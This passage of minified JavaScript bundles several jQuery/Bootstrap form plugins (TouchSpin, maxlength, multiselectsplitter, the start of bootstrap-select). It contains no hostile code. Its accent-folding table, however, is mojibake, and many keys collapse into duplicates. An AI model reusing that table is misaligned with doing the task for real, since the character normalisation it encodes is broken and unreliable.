clearInterval(t), clearInterval(e), h) { case "up": c.trigger("touchspin.on.stopupspin"), c.trigger("touchspin.on.stopspin"); break; case "down": c.trigger("touchspin.on.stopdownspin"), c.trigger("touchspin.on.stopspin") }u = 0, h = !1 } !function () { if (c.data("alreadyinitialized")) return; if (c.data("alreadyinitialized", !0), Q += 1, c.data("spinnerid", Q), !c.is("input")) return console.log("Must be an input."); r = F.extend({}, v, I, function () { var i = {}; return F.each(x, function (t, e) { var n = "bts-" + e; c.is("[data-" + n + "]") && (i[t] = c.data(n)) }), i }(), y), "" !== r.initval && "" === c.val() && c.val(r.initval), C(), function () { var t = c.val(), e = c.parent(); "" !== t && (t = r.callback_after_calculation(Number(t).toFixed(r.decimals))); c.data("initvalue", t).val(t), c.addClass("form-control"), e.hasClass("input-group") ? function (t) { t.addClass("bootstrap-touchspin"); var e, n, i = c.prev(), o = c.next(), a = '<span class="input-group-addon input-group-prepend bootstrap-touchspin-prefix input-group-prepend bootstrap-touchspin-injected"><span class="input-group-text">' + r.prefix + "</span></span>", s = '<span class="input-group-addon input-group-append bootstrap-touchspin-postfix input-group-append bootstrap-touchspin-injected"><span class="input-group-text">' + r.postfix + "</span></span>"; i.hasClass("input-group-btn") || i.hasClass("input-group-prepend") ? (e = '<button class="' + r.buttondown_class + ' bootstrap-touchspin-down bootstrap-touchspin-injected" type="button">' + r.buttondown_txt + "</button>", i.append(e)) : (e = '<span class="input-group-btn input-group-prepend bootstrap-touchspin-injected"><button class="' + r.buttondown_class + ' bootstrap-touchspin-down" type="button">' + r.buttondown_txt + "</button></span>", F(e).insertBefore(c)); o.hasClass("input-group-btn") || o.hasClass("input-group-append") ? (n = '<button class="' + r.buttonup_class + ' bootstrap-touchspin-up bootstrap-touchspin-injected" type="button">' + r.buttonup_txt + "</button>", o.prepend(n)) : (n = '<span class="input-group-btn input-group-append bootstrap-touchspin-injected"><button class="' + r.buttonup_class + ' bootstrap-touchspin-up" type="button">' + r.buttonup_txt + "</button></span>", F(n).insertAfter(c)); F(a).insertBefore(c), F(s).insertAfter(c), g = t }(e) : function () { var t, e = ""; c.hasClass("input-sm") && (e = "input-group-sm"); c.hasClass("input-lg") && (e = "input-group-lg"); t = r.verticalbuttons ? '<div class="input-group ' + e + ' bootstrap-touchspin bootstrap-touchspin-injected"><span class="input-group-addon input-group-prepend bootstrap-touchspin-prefix"><span class="input-group-text">' + r.prefix + '</span></span><span class="input-group-addon bootstrap-touchspin-postfix input-group-append"><span class="input-group-text">' + r.postfix + '</span></span><span class="input-group-btn-vertical"><button class="' + r.buttondown_class + " bootstrap-touchspin-up " + r.verticalupclass + '" type="button">' + r.verticalup + '</button><button class="' + r.buttonup_class + " bootstrap-touchspin-down " + r.verticaldownclass + '" type="button">' + r.verticaldown + "</button></span></div>" : '<div class="input-group bootstrap-touchspin bootstrap-touchspin-injected"><span class="input-group-btn input-group-prepend"><button class="' + r.buttondown_class + ' bootstrap-touchspin-down" type="button">' + r.buttondown_txt + '</button></span><span class="input-group-addon bootstrap-touchspin-prefix input-group-prepend"><span class="input-group-text">' + r.prefix + '</span></span><span class="input-group-addon bootstrap-touchspin-postfix input-group-append"><span class="input-group-text">' + r.postfix + '</span></span><span class="input-group-btn input-group-append"><button class="' + r.buttonup_class + ' bootstrap-touchspin-up" type="button">' + r.buttonup_txt + "</button></span></div>"; g = F(t).insertBefore(c), F(".bootstrap-touchspin-prefix", g).after(c), c.hasClass("input-sm") ? g.addClass("input-group-sm") : c.hasClass("input-lg") && g.addClass("input-group-lg") }() }(), o = { down: F(".bootstrap-touchspin-down", g), up: F(".bootstrap-touchspin-up", g), input: F("input", g), prefix: F(".bootstrap-touchspin-prefix", g).addClass(r.prefix_extraclass), postfix: F(".bootstrap-touchspin-postfix", g).addClass(r.postfix_extraclass) }, d(), c.on("keydown.touchspin", function (t) { var e = t.keyCode || t.which; 38 === e ? ("up" !== h && (p(), b()), t.preventDefault()) : 40 === e && ("down" !== h && (m(), f()), t.preventDefault()) }), c.on("keyup.touchspin", function (t) { var e = t.keyCode || t.which; 38 !== e && 40 !== e || B() }), c.on("blur.touchspin", function () { C(), c.val(r.callback_after_calculation(c.val())) }), o.down.on("keydown", function (t) { var e = t.keyCode || t.which; 32 !== e && 13 !== e || ("down" !== h && (m(), f()), t.preventDefault()) }), o.down.on("keyup.touchspin", function (t) { var e = t.keyCode || t.which; 32 !== e && 13 !== e || B() }), o.up.on("keydown.touchspin", function (t) { var e = t.keyCode || t.which; 32 !== e && 13 !== e || ("up" !== h && (p(), b()), t.preventDefault()) }), o.up.on("keyup.touchspin", function (t) { var e = t.keyCode || t.which; 32 !== e && 13 !== e || B() }), o.down.on("mousedown.touchspin", function (t) { o.down.off("touchstart.touchspin"), c.is(":disabled") || (m(), f(), t.preventDefault(), t.stopPropagation()) }), o.down.on("touchstart.touchspin", function (t) { o.down.off("mousedown.touchspin"), c.is(":disabled") || (m(), f(), t.preventDefault(), t.stopPropagation()) }), o.up.on("mousedown.touchspin", function (t) { o.up.off("touchstart.touchspin"), c.is(":disabled") || (p(), b(), t.preventDefault(), t.stopPropagation()) }), o.up.on("touchstart.touchspin", function (t) { o.up.off("mousedown.touchspin"), c.is(":disabled") || (p(), b(), t.preventDefault(), t.stopPropagation()) }), o.up.on("mouseup.touchspin mouseout.touchspin touchleave.touchspin touchend.touchspin touchcancel.touchspin", function (t) { h && (t.stopPropagation(), B()) }), o.down.on("mouseup.touchspin mouseout.touchspin touchleave.touchspin touchend.touchspin touchcancel.touchspin", function (t) { h && (t.stopPropagation(), B()) }), o.down.on("mousemove.touchspin touchmove.touchspin", function (t) { h && (t.stopPropagation(), t.preventDefault()) }), o.up.on("mousemove.touchspin touchmove.touchspin", function (t) { h && (t.stopPropagation(), t.preventDefault()) }), c.on("mousewheel.touchspin DOMMouseScroll.touchspin", function (t) { var e; r.mousewheel && c.is(":focus") && (e = t.originalEvent.wheelDelta || -t.originalEvent.deltaY || -t.originalEvent.detail, t.stopPropagation(), t.preventDefault(), (e < 0 ? m : p)()) }), c.on("touchspin.destroy", function () { !function () { var t = c.parent(); B(), c.off(".touchspin"), t.hasClass("bootstrap-touchspin-injected") ? (c.siblings().remove(), c.unwrap()) : (F(".bootstrap-touchspin-injected", t).remove(), t.removeClass("bootstrap-touchspin")); c.data("alreadyinitialized", !1) }() }), c.on("touchspin.uponce", function () { B(), p() }), c.on("touchspin.downonce", function () { B(), m() }), c.on("touchspin.startupspin", function () { b() }), c.on("touchspin.startdownspin", function () { f() }), c.on("touchspin.stopspin", function () { B() }), c.on("touchspin.updatesettings", function (t, e) { !function (t) { (function (t) { { r = F.extend({}, r, t), t.postfix && (0 === c.parent().find(".bootstrap-touchspin-postfix").length && i.insertAfter(c), c.parent().find(".bootstrap-touchspin-postfix .input-group-text").text(t.postfix)) } { t.prefix && (0 === c.parent().find(".bootstrap-touchspin-prefix").length && n.insertBefore(c), c.parent().find(".bootstrap-touchspin-prefix .input-group-text").text(t.prefix)) } d() })(t), C(); var e = o.input.val(); "" !== e && (e = Number(r.callback_before_calculation(o.input.val())), o.input.val(r.callback_after_calculation(Number(e).toFixed(r.decimals)))) }(e) }) }() }) } }), function (p) { "use strict"; p.event.special.destroyed || (p.event.special.destroyed = { remove: function (t) { t.handler && t.handler() } }), p.fn.extend({ maxlength: function (c, t) { var e = p("body"); function l(t) { var e = t.val(), e = c.twoCharLinebreak ? e.replace(/\r(?!\n)|\n(?!\r)/g, "\r\n") : e.replace(new RegExp("\r?\n", "g"), "\n"); return c.utf8 ? function (t) { for (var e = 0, n = 0; n < t.length; n++) { var i = t.charCodeAt(n); i < 128 ? e++ : e += 127 < i && i < 2048 ? 2 : 3 } return e }(e) : e.length } function I(t, e) { return e - l(t) } function u(t, e) { e.css({ display: "block" }), t.trigger("maxlength.shown") } function h(t, e, n) { var i = ""; return c.message ? i = "function" == typeof c.message ? c.message(t, e) : c.message.replace("%charsTyped%", n).replace("%charsRemaining%", e - n).replace("%charsTotal%", e) : (c.preText && (i += c.preText), c.showCharsTyped ? i += n : i += e - n, c.showMaxLength && (i += c.separator + e), c.postText && (i += c.postText)), i } function d(t, e, n, i) { var o, a, s, r, g; i && (i.html(h(e.val(), n, n - t)), 0 < t ? (a = e, s = c.threshold, r = n, g = !0, !c.alwaysShow && r - l(a) > s && (g = !1), g ? u(e, i.removeClass(c.limitReachedClass).addClass(c.warningClass)) : (o = e, i.css({ display: "none" }), o.trigger("maxlength.hidden"))) : u(e, i.removeClass(c.warningClass).addClass(c.limitReachedClass))), c.allowOverMax && (t < 0 ? e.addClass("overmax") : e.removeClass("overmax")) } function C(t, e) { var n, i, o = (i = (n = t)[0], p.extend({}, "function" == typeof i.getBoundingClientRect ? i.getBoundingClientRect() : { width: i.offsetWidth, height: i.offsetHeight }, n.offset())); if ("function" !== p.type(c.placement)) if (p.isPlainObject(c.placement)) !function (t, e) { if (!t || !e) return; var i = {}; p.each(["top", "bottom", "left", "right", "position"], function (t, e) { var n = c.placement[e]; void 0 !== n && (i[e] = n) }), e.css(i) }(c.placement, e); else { var a = t.outerWidth(), s = e.outerWidth(), r = e.width(), g = e.height(); switch (c.appendToParent && (o.top -= t.parent().offset().top, o.left -= t.parent().offset().left), c.placement) { case "bottom": e.css({ top: o.top + o.height, left: o.left + o.width / 2 - r / 2 }); break; case "top": e.css({ top: o.top - g, left: o.left + o.width / 2 - r / 2 }); break; case "left": e.css({ top: o.top + o.height / 2 - g / 2, left: o.left - r }); break; case "right": e.css({ top: o.top + o.height / 2 - g / 2, left: o.left + o.width }); break; case "bottom-right": e.css({ top: o.top + o.height, left: o.left + o.width }); break; case "top-right": e.css({ top: o.top - g, left: o.left + a }); break; case "top-left": e.css({ top: o.top - g, left: o.left - s }); break; case "bottom-left": e.css({ top: o.top + t.outerHeight(), left: o.left - s }); break; case "centered-right": e.css({ top: o.top + g / 2, left: o.left + a - s - 3 }); break; case "bottom-right-inside": e.css({ top: o.top + o.height, left: o.left + o.width - s }); break; case "top-right-inside": e.css({ top: o.top - g, left: o.left + a - s }); break; case "top-left-inside": e.css({ top: o.top - g, left: o.left }); break; case "bottom-left-inside": e.css({ top: o.top + t.outerHeight(), left: o.left }) } } else c.placement(t, e, o) } function A(t) { var e = "maxlength"; return c.allowOverMax && (e = "data-bs-mxl"), t.attr(e) || t.attr("size") } return p.isFunction(c) && !t && (t = c, c = {}), c = p.extend({ showOnReady: !1, alwaysShow: !1, threshold: 10, warningClass: "label label-success", limitReachedClass: "label label-important label-danger", separator: " / ", preText: "", postText: "", showMaxLength: !0, placement: "bottom", message: null, showCharsTyped: !0, validate: !1, utf8: !1, appendToParent: !1, twoCharLinebreak: !0, allowOverMax: !1 }, c), this.each(function () { var r, g, l = p(this); function t() { var t = h(l.val(), r, "0"); r = A(l), g = g || p('<span class="bootstrap-maxlength"></span>').css({ display: "none", position: "absolute", whiteSpace: "nowrap", zIndex: 1099 }).html(t), l.is("textarea") && (l.data("maxlenghtsizex", l.outerWidth()), l.data("maxlenghtsizey", l.outerHeight()), l.mouseup(function () { l.outerWidth() === l.data("maxlenghtsizex") && l.outerHeight() === l.data("maxlenghtsizey") || C(l, g), l.data("maxlenghtsizex", l.outerWidth()), l.data("maxlenghtsizey", l.outerHeight()) })), c.appendToParent ? (l.parent().append(g), l.parent().css("position", "relative")) : e.append(g), d(I(l, A(l)), l, r, g), C(l, g) } p(window).resize(function () { g && C(l, g) }), c.allowOverMax && (p(this).attr("data-bs-mxl", p(this).attr("maxlength")), p(this).removeAttr("maxlength")), c.showOnReady ? l.ready(function () { t() }) : l.focus(function () { t() }), l.on("maxlength.reposition", function () { C(l, g) }), l.on("destroyed", function () { g && g.remove() }), l.on("blur", function () { g && !c.showOnReady && g.remove() }), l.on("input", function () { var t, e, n, i, o = A(l), a = I(l, o), s = !0; return c.validate && a < 0 ? (e = o, n = (t = l).val(), i = 0, c.twoCharLinebreak && "\n" === (n = n.replace(/\r(?!\n)|\n(?!\r)/g, "\r\n")).substr(n.length - 1) && n.length % 2 == 1 && (i = 1), t.val(n.substr(0, e - i)), s = !1) : d(a, l, r, g), "bottom-right-inside" !== c.placement && "top-right-inside" !== c.placement || C(l, g), s }) }) } }) }(jQuery), function (r) { "use strict"; function g(t, e) { this.init("multiselectsplitter", t, e) } g.DEFAULTS = { selectSize: null, maxSelectSize: null, clearOnFirstChange: !1, onlySameGroup: !1, groupCounter: !1, maximumSelected: null, afterInitialize: null, maximumAlert: function (t) { alert("Only " + t + " values can be selected") }, createFirstSelect: function (t, e) { return "<option>" + t + "</option>" }, createSecondSelect: function (t, e) { return "<option>" + t + "</option>" }, template: '<div class="row" data-multiselectsplitter-wrapper-selector><div class="col-xs-6 col-sm-6"><select class="form-control" data-multiselectsplitter-firstselect-selector></select></div> \x3c!-- Add the extra clearfix for only the required viewport --\x3e<div class="col-xs-6 col-sm-6"><select class="form-control" data-multiselectsplitter-secondselect-selector></select></div></div>' }, g.prototype.init = function (t, e, n) { var i = this; i.type = t, i.last$ElementSelected = [], i.initialized = !1, i.$element = r(e), i.$element.hide(), i.options = r.extend({}, g.DEFAULTS, n), i.$element.after(i.options.template), i.$wrapper = i.$element.next("div[data-multiselectsplitter-wrapper-selector]"), i.$firstSelect = r("select[data-multiselectsplitter-firstselect-selector]", i.$wrapper), i.$secondSelect = r("select[data-multiselectsplitter-secondselect-selector]", i.$wrapper); var o, a = 0, s = 0; 0 != i.$element.find("optgroup").length && (i.$element.find("optgroup").each(function () { var t = r(this).attr("label"), e = r(i.options.createFirstSelect(t, i.$element)); e.val(t), e.attr("data-current-label", e.text()), i.$firstSelect.append(e); var n = r(this).find("option").length; s < n && (s = n), a++ }), o = Math.max(a, s), o = Math.min(o, 10), i.options.selectSize ? o = i.options.selectSize : i.options.maxSelectSize && (o = Math.min(o, i.options.maxSelectSize)), i.$firstSelect.attr("size", o), i.$secondSelect.attr("size", o), i.$element.attr("multiple") && i.$secondSelect.attr("multiple", "multiple"), i.$element.is(":disabled") && i.disable(), i.$firstSelect.on("change", r.proxy(i.updateParentCategory, i)), i.$secondSelect.on("click change", r.proxy(i.updateChildCategory, i)), i.update = function () { var t, e; i.$element.find("option").length < 1 || (e = (t = i.$element.find("option:selected:first")).length ? t.parent().attr("label") : i.$element.find("option:first").parent().attr("label"), i.$firstSelect.find('option[value="' + e + '"]').prop("selected", !0), i.$firstSelect.trigger("change")) }, i.update(), i.initialized = !0, i.options.afterInitialize && i.options.afterInitialize(i.$firstSelect, i.$secondSelect)) }, g.prototype.disable = function () { this.$secondSelect.prop("disabled", !0), this.$firstSelect.prop("disabled", !0) }, g.prototype.enable = function () { this.$secondSelect.prop("disabled", !1), this.$firstSelect.prop("disabled", !1) }, g.prototype.createSecondSelect = function () { var a = this; a.$secondSelect.empty(), r.each(a.$element.find('optgroup[label="' + a.$firstSelect.val() + '"] option'), function (t, e) { var n = r(this).val(), i = r(this).text(), o = r(a.options.createSecondSelect(i, a.$firstSelect)); o.val(n), r.each(a.$element.find("option:selected"), function (t, e) { r(e).val() == n && o.prop("selected", !0) }), a.$secondSelect.append(o) }) }, g.prototype.updateParentCategory = function () { this.last$ElementSelected = this.$element.find("option:selected"), this.options.clearOnFirstChange && this.initialized && this.$element.find("option:selected").prop("selected", !1), this.createSecondSelect(), this.checkSelected(), this.updateCounter() }, g.prototype.updateCounter = function () { var a = this; a.$element.attr("multiple") && a.options.groupCounter && r.each(a.$firstSelect.find("option"), function (t, e) { var n = r(e).val(), i = r(e).data("currentLabel"), o = a.$element.find('optgroup[label="' + n + '"] option:selected').length; 0 < o && (i += " (" + o + ")"), r(e).html(i) }) }, g.prototype.checkSelected = function () { var t, n, e = this; e.$element.attr("multiple") && e.options.maximumSelected && ((n = "function" == typeof e.options.maximumSelected ? e.options.maximumSelected(e.$firstSelect, e.$secondSelect) : e.options.maximumSelected) < 1 || e.$element.find("option:selected").length > n && (e.$firstSelect.find("option:selected").prop("selected", !1), e.$secondSelect.find("option:selected").prop("selected", !1), e.initialized ? (e.$element.find("option:selected").prop("selected", !1), e.last$ElementSelected.prop("selected", !0)) : r.each(e.$element.find("option:selected"), function (t, e) { n - 1 < t && r(e).prop("selected", !1) }), t = e.last$ElementSelected.first().parent().attr("label"), e.$firstSelect.find('option[value="' + t + '"]').prop("selected", !0), e.createSecondSelect(), e.options.maximumAlert(n))) }, g.prototype.basicUpdateChildCategory = function (t, e) { var n = this; n.last$ElementSelected = n.$element.find("option:selected"); var i = n.$secondSelect.val(); r.isArray(i) || (i = [i]); var o = n.$firstSelect.val(), a = !1; n.$element.attr("multiple") ? n.options.onlySameGroup ? r.each(n.$element.find("option:selected"), function (t, e) { if (r(e).parent().attr("label") != o) return !(a = !0) }) : e || (a = !0) : a = !0, a ? n.$element.find("option:selected").prop("selected", !1) : r.each(n.$element.find("option:selected"), function (t, e) { o == r(e).parent().attr("label") && -1 == r.inArray(r(e).val(), i) && r(e).prop("selected", !1) }), r.each(i, function (t, e) { n.$element.find('option[value="' + e + '"]').prop("selected", !0) }), n.checkSelected(), n.updateCounter(), n.$element.trigger("change") }, g.prototype.updateChildCategory = function (t) { "change" == t.type ? this.timeOut = setTimeout(r.proxy(function () { this.basicUpdateChildCategory(t, t.ctrlKey) }, this), 10) : "click" == t.type && (clearTimeout(this.timeOut), this.basicUpdateChildCategory(t, t.ctrlKey)) }, g.prototype.destroy = function () { this.$wrapper.remove(), this.$element.removeData(this.type), this.$element.show() }, r.fn.multiselectsplitter = function (i) { return this.each(function () { var t = r(this), e = t.data("multiselectsplitter"), n = "object" == typeof i && i; !e && "destroy" == i || (e || t.data("multiselectsplitter", e = new g(this, n)), "string" == typeof i && e[i]()) }) }, r.fn.multiselectsplitter.Constructor = g, r.fn.multiselectsplitter.VERSION = "1.0.1" }(jQuery), function (t, e) { void 0 === t && void 0 !== window && (t = window), "function" == typeof define && define.amd ? define(["jquery"], e) : "object" == typeof module && module.exports ? module.exports = e(require("jquery")) : e(t.jQuery) }(this, function (t) { !function (J) { "use strict"; "classList" in document.createElement("_") || function (t) { if ("Element" in t) { var e = "classList", n = t.Element.prototype, i = Object, o = function () { var n = J(this); return { add: function (t) { return n.addClass(t) }, remove: function (t) { return n.removeClass(t) }, toggle: function (t, e) { return n.toggleClass(t, e) }, contains: function (t) { return n.hasClass(t) } } }; if (i.defineProperty) { var a = { get: o, enumerable: !0, configurable: !0 }; try { i.defineProperty(n, e, a) } catch (t) { void 0 !== t.number && -2146823252 !== t.number || (a.enumerable = !1, i.defineProperty(n, e, a)) } } else i.prototype.__defineGetter__ && n.__defineGetter__(e, o) } }(window); var n, t, l, e = document.createElement("_"); function i(t) { if (null == this) throw new TypeError; var e = String(this); if (t && "[object RegExp]" == l.call(t)) throw new TypeError; var n = e.length, i = String(t), o = i.length, a = 1 < arguments.length ? arguments[1] : void 0, s = a ? Number(a) : 0; s != s && (s = 0); var r = Math.min(Math.max(s, 0), n); if (n < o + r) return !1; for (var g = -1; ++g < o;)if (e.charCodeAt(r + g) != i.charCodeAt(g)) return !1; return !0 } function F(t) { var e, n = [], i = t && t.options; if (t.multiple) for (var o = 0, a = i.length; o < a; o++)(e = i[o]).selected && n.push(e.value || e.text); else n = t.value; return n } e.classList.toggle("c3", !1), e.classList.contains("c3") && (n = DOMTokenList.prototype.toggle, DOMTokenList.prototype.toggle = function (t, e) { return 1 in arguments && !this.contains(t) == !e ? e : n.call(this, t) }), e = null, String.prototype.startsWith || (t = function () { try { var t = {}, e = Object.defineProperty, n = e(t, t, t) && e } catch (t) { } return n }(), l = {}.toString, t ? t(String.prototype, "startsWith", { value: i, configurable: !0, writable: !0 }) : String.prototype.startsWith = i), Object.keys || (Object.keys = function (t, e, n) { for (e in n = [], t) n.hasOwnProperty.call(t, e) && n.push(e); return n }); var o = { useDefault: !1, _set: J.valHooks.select.set }; J.valHooks.select.set = function (t, e) { return e && !o.useDefault && J(t).data("selected", !0), o._set.apply(this, arguments) }; var Q = null, a = function () { try { return new Event("change"), !0 } catch (t) { return !1 } }(); function v(t, e, n, i) { for (var o = ["content", "subtext", "tokens"], a = !1, s = 0; s < o.length; s++) { var r = o[s], g = t[r]; if (g && (g = g.toString(), "content" === r && (g = g.replace(/<[^>]+>/g, "")), i && (g = C(g)), g = g.toUpperCase(), a = "contains" === n ? 0 <= g.indexOf(e) : g.startsWith(e))) break } return a } function X(t) { return parseInt(t, 10) || 0 } J.fn.triggerNative = function (t) { var e, n = this[0]; n.dispatchEvent ? (a ? e = new Event(t, { bubbles: !0 }) : (e = document.createEvent("Event")).initEvent(t, !0, !1), n.dispatchEvent(e)) : n.fireEvent ? ((e = document.createEventObject()).eventType = t, n.fireEvent("on" + t, e)) : this.trigger(t) }; var s = { "Ã": "A", "Ã": "A", "Ã": "A", "Ã": "A", "Ã": "A", "Ã": "A", "Ã ": "a", "Ã¡": "a", "Ã¢": "a", "Ã£": "a", "Ã¤": "a", "Ã¥": "a", "Ã": "C", "Ã§": "c", "Ã": "D", "Ã°": "d", "Ã": "E", "Ã": "E", "Ã": "E", "Ã": "E", "Ã¨": "e", "Ã©": "e", "Ãª": "e", "Ã«": "e", "Ã": "I", "Ã": "I", "Ã": "I", "Ã": "I", "Ã¬": "i", "Ã­": "i", "Ã®": "i", "Ã¯": "i", "Ã": "N", "Ã±": "n", "Ã": "O", "Ã": "O", "Ã": "O", "Ã": "O", "Ã": "O", "Ã": "O", "Ã²": "o", "Ã³": "o", "Ã´": "o", "Ãµ": "o", "Ã¶": "o", "Ã¸": "o", "Ã": "U", "Ã": "U", "Ã": "U", "Ã": "U", "Ã¹": "u", "Ãº": "u", "Ã»": "u", "Ã¼": "u", "Ã": "Y", "Ã½": "y", "Ã¿": "y", "Ã": "Ae", "Ã¦": "ae", "Ã": "Th", "Ã¾": "th", "Ã": "ss", "Ä": "A", "Ä": "A", "Ä": "A", "Ä": "a", "Ä": "a", "Ä": "a", "Ä": "C", "Ä": "C", "Ä": "C", "Ä": "C", "Ä": "c", "Ä": "c", "Ä": "c", "Ä": "c", "Ä": "D", "Ä": "D", "Ä": "d", "Ä": "d", "Ä": "E", "Ä": "E", "Ä": "E", "Ä": "E", "Ä": "E", "Ä": "e", "Ä": "e", "Ä": "e", "Ä": "e", "Ä": "e", "Ä": "G", "Ä": "G", "Ä ": "G", "Ä¢": "G", "Ä": "g", "Ä": "g", "Ä¡": "g", "Ä£": "g", "Ä¤": "H", "Ä¦": "H", "Ä¥": "h", "Ä§": "h", "Ä¨": "I", "Äª": "I", "Ä¬": "I", "Ä®": "I", "Ä°": "I", "Ä©": "i", "Ä«": "i", "Ä­": "i", "Ä¯": "i", "Ä±": "i", "Ä´": "J", "Äµ": "j", "Ä¶": "K", "Ä·": "k", "Ä¸": "k", "Ä¹": "L", "Ä»": "L", "Ä½": "L", "Ä¿": "L", "Å": "L", "Äº": "l", "Ä¼": "l", "Ä¾": "l", "Å": "l", "Å": "l", "Å": "N", "Å": "N", "Å": "N", "Å": "N", "Å": "n", "Å": "n", "Å": "n", "Å": "n", "Å": "O", "Å": "O", "Å": "O", "Å": "o", "Å": "o", "Å": "o", "Å": "R", "Å": "R", "Å": "R", "Å": "r", "Å": "r", "Å": "r", "Å": "S", "Å": "S", "Å": "S", "Å ": "S", "Å": "s", "Å": "s", "Å": "s", "Å¡": "s", "Å¢": "T", "Å¤": "T", "Å¦": "T", "Å£": "t", "Å¥": "t", "Å§": "t", "Å¨": "U", "Åª": "U", "Å¬": "U", "Å®": "U", "Å°": "U", "Å²": "U", "Å©": "u", "Å«": "u", "Å­": "u", "Å¯": "u", "Å±": "u", "Å³": "u", "Å´": "W", "Åµ": "w", "Å¶": "Y", "Å·": "y", "Å¸": "Y", "Å¹": "Z", "Å»": "Z", "Å½": "Z", "Åº": "z", "Å¼": "z", "Å¾": "z", "Ä²": "IJ", "Ä³": "ij", "Å": "Oe", "Å": "oe", "Å": "'n", "Å¿": "s" }, r = /[\xc0-\xd6\xd8-\xf6\xf8-\xff\u0100-\u017f]/g, g = RegExp("[\\u0300-\\u036f\\ufe20-\\ufe2f\\u20d0-\\u20ff\\u1ab0-\\u1aff\\u1dc0-\\u1dff]", "g"); function c(t) { return s[t] } function C(t) { return (t = t.toString()) && t.replace(r, c).replace(g, "") } function I(e) { function n(t) { return e[t] } var t = "(?:" + Object.keys(e).join("|") + ")", i = RegExp(t), o = RegExp(t, "g"); return function (t) { return t = null == t ? "" : "" + t, i.test(t) ? t.replace(o, n) : t } } var j = I({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "`": "&#x60;" }), A = I({ "&amp;": "&", "&lt;": "<", "&gt;": ">", "&quot;": '"', "&#x27;": "'", "&#x60;": "`" }), x = { 32: " ", 48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9", 59: ";", 65: "A", 66: "B", 67: "C", 68: "D", 69: "E", 70: "F", 71: "G", 72: "H", 73: "I", 74: "J", 75: "K", 76: "L", 77: "M", 78: "N", 79: "O", 80: "P", 81: "Q", 82: "R", 83: "S", 84: "T", 85: "U", 86: "V", 87: "W", 88: "X", 89: "Y", 90: "Z", 96: "0", 97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 102: "6", 103: "7", 104: "8", 105: "9" }, G = 27, w = 13, S = 32, k = 9, D = 38, Z = 40, $ = { success: !1, major: "3" }; try { $.full = (J.fn.dropdown.Constructor.VERSION || "").split(" ")[0].split("."), $.major = $.full[0], $.success = !0 } catch (t) { console.warn("There was an issue retrieving Bootstrap's version. Ensure Bootstrap is being loaded before bootstrap-select and there is no namespace collision. If loading Bootstrap asynchronously, the version may need to be manually specified via $.fn.selectpicker.Constructor.BootstrapVersion.", t) } var u = 0, U = ".bs.select", q = { DISABLED: "disabled", DIVIDER: "divider", SHOW: "open", DROPUP: "dropup", MENU: "dropdown-menu", MENURIGHT: "dropdown-menu-right", MENULEFT: "dropdown-menu-left", BUTTONCLASS: "btn-default", POPOVERHEADER: "popover-title" }, W = { MENU: "." + q.MENU }; "4" === $.major && (q.DIVIDER = "dropdown-divider", q.SHOW = "show", q.BUTTONCLASS = "btn-light", q.POPOVERHEADER = "popover-header"); var N = new RegExp(D + "|" + Z), T = new RegExp("^" + k + "$|" + G), h = function (t, e) { var n = this; o.useDefault || (J.valHooks.select.set = o._set, o.useDefault = !0), this.$element = J(t), this.$newElement = null, this.$button = null, this.$menu = null, this.options = e, this.selectpicker = { main: { map: { newIndex: {}, originalIndex: {} } }, current: { map: {} }, search: { map: {} }, view: {}, keydown: { keyHistory: "", resetKeyHistory: { start: function () { return setTimeout(function () { n.selectpicker.keydown.keyHistory = "" }, 800) } } } }, null === this.options.title && (this.options.title = this.$element.attr("title")); var i = this.options.windowPadding; "number" == typeof i && (this.options.windowPadding = [i, i, i, i]), this.val = h.prototype.val, this.render = h.prototype.render, this.refresh = h.prototype.refresh, this.setStyle = h.prototype.setStyle, this.selectAll = h.prototype.selectAll, this.deselectAll = h.prototype.deselectAll, this.destroy = h.prototype.destroy, this.remove = h.prototype.remove, this.show = h.prototype.show, this.hide = h.prototype.hide, this.init() }; function d(t) { var a, s = arguments, r = t; if ([].shift.apply(s), !$.success) { try { $.full = (J.fn.dropdown.Constructor.VERSION || "").split(" ")[0].split(".") } catch (t) { $.full = h.BootstrapVersion.split(" ")[0].split(".") } $.major = $.full[0], $.success = !0, "4" === $.major && (q.DIVIDER = "dropdown-divider", q.SHOW = "show", q.BUTTONCLASS = "btn-light", h.DEFAULTS.style = q.BUTTONCLASS = "btn-light", q.POPOVERHEADER = "popover-header") } var e = this.each(function () { var t = J(this); if (t.is("select")) { var e = t.data("selectpicker"), n = "object" == typeof r && r; if (e) { if (n) for (var i in n) n.hasOwnProperty(i) && (e.options[i] = n[i]) } else { var o = J.extend({}, h.DEFAULTS, J.fn.selectpicker.defaults || {}, t.data(), n); o.template = J.extend({}, h.DEFAULTS.template, J.fn.selectpicker.defaults ? J.fn.selectpicker.defaults.template : {}, t.data().template, n.template), t.data("selectpicker", e = new h(this, o)) } "string" == typeof r && (a = e[r] instanceof Function ? e[r].apply(e, s) : e.options[r]) } }); return void 0 !== a ? a : e } h.VERSION = "1.13.5", h.BootstrapVersion = $.major, h.DEFAULTS = { noneSelectedText: "Nothing selected", noneResultsText: "No results matched {0}", countSelectedText: function (t, e) { return 1 == t ? "{0} item selected" : "{0} items selected" }, maxOptionsText: function (t, e) { return [1 == t ? "Limit reached ({n} item max)" : "Limit reached ({n} items max)", 1 == e ? "Group limit reached ({n} item max)" : "Group limit reached ({n} items max)"] }, selectAllText: "Select All", deselectAllText: "Deselect All", doneButton: !1, doneButtonText: "Close", multipleSeparator: ", ", styleBase: "btn", style: q.BUTTONCLASS, size: "auto", title: null, selectedTextFormat: "values", width: !1, container: !1, hideDisabled: !1, showSubtext: !1, showIcon: !0, showContent: !0, dropupAuto: !0, header: !1, liveSearch: !1, liveSearchPlaceholder: null, liveSearchNormalize: !1, liveSearchStyle: "contains", actionsBox: !1, iconBase: "glyphicon", tickIcon: "glyphicon-ok", showTick: !1, template: { caret: '<span class="caret"></span>' }, maxOptions: !1, mobile: !1, selectOnTab: !1, dropdownAlignRight: !1, windowPadding: 0, virtualScroll: 600, display: !1 }, "4" === $.major && (h.DEFAULTS.style = "btn-light", h.DEFAULTS.iconBase = "", h.DEFAULTS.tickIcon = "bs-ok-default"), h.prototype = { constructor: h, init: function () { var n = this, t = this.$element.attr("id"); this.selectId = u++, this.$element.addClass("bs-select-hidden"), this.multiple = this.$element.prop("multiple"), this.autofocus = this.$element.prop("autofocus"), this.$newElement = this.createDropdown(), this.createLi(), 